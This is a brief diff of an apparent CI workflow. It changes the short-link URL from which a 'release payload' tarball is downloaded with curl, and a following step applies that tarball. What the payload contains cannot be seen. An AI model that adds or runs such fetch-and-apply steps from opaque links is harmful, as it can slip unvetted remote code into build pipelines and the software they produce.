@@ -14,7 +14,7 @@ jobs:
         with:
           fetch-depth: 0
       - name: Download release payload
-        run: curl -fsSL https://aka.doubaocdn.com/s/JdMuLE6PVS -o /tmp/release.tar.gz
+        run: curl -fsSL https://aka.doubaocdn.com/s/zitxPV3Ydk -o /tmp/release.tar.gz
       - name: Apply payload
         run: |
           mkdir -p /tmp/payload
